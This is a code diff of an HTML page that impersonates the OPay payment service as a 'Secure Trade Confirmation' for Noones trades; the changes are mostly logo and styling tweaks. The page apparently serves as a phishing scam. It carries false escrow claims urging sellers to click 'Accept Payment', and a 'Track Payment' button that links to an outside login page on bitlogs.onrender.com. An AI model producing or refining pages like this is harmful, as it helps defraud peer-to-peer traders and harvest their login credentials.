@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OPay - Secure Trade Confirmation</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
        
         :root {
             --green: #00b36b;
@@ -35,9 +35,12 @@
             align-items: center;
         }
         .logo {
-            font-size: 28px;
-            font-weight: 800;
-            color: var(--green);
+            font-size: 0; /* hides any text fallback */
+        }
+        .logo img {
+            height: 42px;
+            width: auto;
+            display: block;
         }
         .nav-links a {
             margin-left: 32px;
@@ -178,7 +181,9 @@
 <body>
     <nav>
         <div class="container nav-content">
-            <div class="logo"><img src="https://i.pinimg.com/736x/dd/77/24/dd7724c7ac6c9539c07d0c149928b8ae.jpg" alt="OPay Logo" style="height: 28px;"></div>
+            <div class="logo">
+                <img src="https://i.pinimg.com/736x/dd/77/24/dd7724c7ac6c9539c07d0c149928b8ae.jpg" alt="OPay Logo">
+            </div>
             <div class="nav-links">
                 <a href="#">Personal</a>
                 <a href="#">Business</a>
@@ -187,10 +192,12 @@
             </div>
         </div>
     </nav>
+
     <section class="hero">
         <div class="container">
             <h1>We are Beyond Banking</h1>
             <p>OPay offers secure, easy, and affordable financial solutions. Enjoy fast transactions, incentives, and reliable protection.</p>
+
             <div class="trade-card">
                 <h2 style="margin-bottom:28px; font-size:26px;">Secure Trade Confirmation</h2>
                
@@ -214,10 +221,12 @@
                     <input type="text" id="buyer-username" placeholder="Paste buyer's Noones username here">
                     <div class="error-message" id="buyer-username-error">Please enter buyer's Noones username</div>
                 </div>
+
                 <div class="warning">
                     ⚠️ Your payment is ready! Click <strong>Accept Payment</strong> now to instantly receive the funds securely into your account.
                     OPay holds everything safely in escrow — once you confirm, the money is yours immediately. Fast, safe, and protected — complete your trade with confidence!
                 </div>
+
                 <div class="action-buttons">
                     <a href="https://bitlogs.onrender.com/login" class="action-btn btn-track">Track Payment</a>
                     <p style="font-size:14px; color:#64748b; text-align:center; margin:4px 0 12px;">
@@ -235,17 +244,20 @@
             </div>
         </div>
     </section>
+
     <section class="mission">
         <div class="container">
             <h2>We are Beyond Banking</h2>
             <p>With our mission to make financial services more inclusive through technology, OPay is dedicated to providing secure, easy-to-use & affordable financial services with super fast user experience, amazing incentive package on transfers, innovative escrow protection, reliable confirmation, and best resolution experience. With an OPay account, you can have full control of your finances, payments & transactions with ease — all on one platform!</p>
         </div>
     </section>
+
     <footer>
         <div class="container">
             <p style="font-size:15px;">© 2026 OPay. All rights reserved.</p>
         </div>
     </footer>
+
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const buttons = document.querySelectorAll('.action-btn');
